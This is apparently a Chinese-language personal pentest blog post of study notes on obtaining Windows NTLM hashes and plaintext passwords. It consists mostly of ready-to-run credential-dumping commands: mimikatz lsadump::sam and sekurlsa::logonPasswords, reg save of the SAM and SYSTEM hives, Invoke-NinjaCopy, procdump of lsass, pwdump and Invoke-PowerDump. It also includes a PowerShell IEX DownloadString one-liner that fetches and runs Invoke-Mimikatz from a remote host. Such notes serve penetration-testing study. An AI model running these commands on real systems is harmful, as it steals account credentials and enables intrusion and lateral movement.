---
draft: false
isCJKLanguage: true
date: 2020-12-08
lastmod: 2020-12-08
title: "获取 NTLM Hash"
description: 我的个人博客，主要用于记录自己的一些渗透测试、编程等学习笔记之类的东西。
categories: 
  - Pentest
tags:
  - intranet
---

### 0x01 通过 sam 文件获取
* 通过 mimikatz 转储 sam 文件得到 hash(cmd 需要管理员权限)
    ```
    mimikatz.exe log "privilege::debug" "token::elevate" "lsadump::sam" exit
    ```

* 通过 reg save 导出 sam 文件(2003 之后可以使用)(导 hiv 文件 cmd 需要管理员权限)
    ```
    reg save HKLM\SAM sam.hive
    reg save HKLM\SYSTEM system.hive
    mimikatz.exe "lsadump::sam /sam:sam.hive /system:system.hive" exit
    ```

* 直接通过 Invoke-NinjaCopy 获取 sam 文件(cmd 需要管理员权限)
    * 下载 [NinjaCopy](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) 这个工具拷贝 sam 文件
        ```
        powershell -exec bypass Import-Module .\Invoke-NinjaCopy.ps1; Invoke-NinjaCopy -Path C:\Windows\System32\config\SAM -LocalDestination .\sam.hive; Invoke-NinjaCopy -Path C:\Windows\System32\config\SYSTEM -LocalDestination .\system.hive
        ```
    * 然后执行 mimikatz.exe "lsadump::sam /sam:sam.hive /system:system.hive" exit 得到 hash

### 0x02 通过 dmp 文件获取(可获取到明文)
* 通过 lsass 进程的 dmp 文件(procdump64 cmd 需要管理员权限)
    * 利用 [procdump](https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdump) 得到 dmp 文件: procdump64.exe -accepteula -ma lsass.exe lsass.dmp
    * 然后执行 mimikatz.exe log "sekurlsa::minidump lsass.dmp" "sekurlsa::logonPasswords full" exit 得到密码

* 通过任务管理器 lsass 进程导出 dmp 文件(显示所有进程时需要管理员权限)
    * 先通过进程转储得到 dmp 文件  
    ![60](/img/post/Xnip2022-10-11_11-04-57.png)
    * 然后执行 mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonPasswords full" exit 得到密码  

### 0x03 通过内存获取(可获取到明文)
* 通过 lsass 进程内存提权(cmd 需要管理员权限)
    ```
    mimikatz.exe log "privilege::debug" "sekurlsa::logonpasswords full" exit
    ```

* powershell 加载 mimikatz 抓取(cmd 需要管理员权限)
    ```
    powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds
    ```
    ```
    或者先下载然后执行
    powershell Import-Module .\Invoke-Mimikatz.ps1; Invoke-Mimikatz -Command '"privilege::debug" "log" "sekurlsa::logonPasswords full"'
    ```

### 0x04 其他方式获取
* 通过 pwdump 获取(cmd 需要管理员权限)
    * 下载 [pwdump](https://www.openwall.com/passwords/windows-pwdump)
    * 下载后执行

* 使用 Invoke-PowerDump 获取(cmd 需要管理员权限)
    * 下载 [Invoke-PowerDump](https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-PowerDump.ps1)
    * 下载后执行
        ```
        powershell Import-Module .\Invoke-PowerDump.ps1; Invoke-PowerDump
        ```
